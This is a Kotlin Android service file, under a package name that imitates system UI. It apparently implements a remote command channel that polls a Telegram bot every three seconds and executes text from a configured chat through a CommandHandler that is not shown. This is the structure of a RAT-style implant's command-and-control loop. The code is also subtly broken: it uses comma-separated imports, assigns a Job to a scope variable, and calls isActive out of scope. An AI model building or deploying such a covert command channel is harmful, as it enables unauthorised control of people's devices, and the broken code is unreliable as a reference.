package com.systemui.package

import android.app.Notification, android.app.NotificationChannel, android.app.NotificationManager
import android.app.PendingIntent, android.content.Intent, android.os.Build, android.os.IBinder, android.util.Log
import androidx.core.app.NotificationCompat, androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*

class TelegramService : LifecycleService() {
    private val TAG = "DeviceRelay"
    private var scope: CoroutineScope? = null
    private var lastUpdateId = 0L
    private var running = false

    companion object {
        const val CHANNEL_ID = "relay_channel"
        const val NOTIFICATION_ID = 1
        const val POLL_INTERVAL_MS = 3000L
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        if (!running) {
            running = true
            startForeground(NOTIFICATION_ID, createNotification())
            scope = CoroutineScope(SupervisorJob() + Dispatchers.IO).launch { pollLoop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        scope?.cancel()
        scope = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Device Relay", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Telegram command polling"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pending = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Relay Active").setContentText("Listening for commands...")
            .setSmallIcon(android.R.drawable.ic_dialog_info).setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW).setContentIntent(pending).build()
    }

    private suspend fun pollLoop() {
        while (running && isActive) {
            try {
                val updates = TelegramApi.getUpdates(lastUpdateId + 1)
                for (u in updates) {
                    if (u.chatId == Config.CHAT_ID) {
                        Log.d(TAG, "Command: ${u.text}")
                        CommandHandler.handle(this@TelegramService, u.text)
                    }
                    if (u.updateId > lastUpdateId) lastUpdateId = u.updateId
                }
            } catch (e: Exception) { Log.e(TAG, "poll error", e) }
            delay(POLL_INTERVAL_MS)
        }
    }
}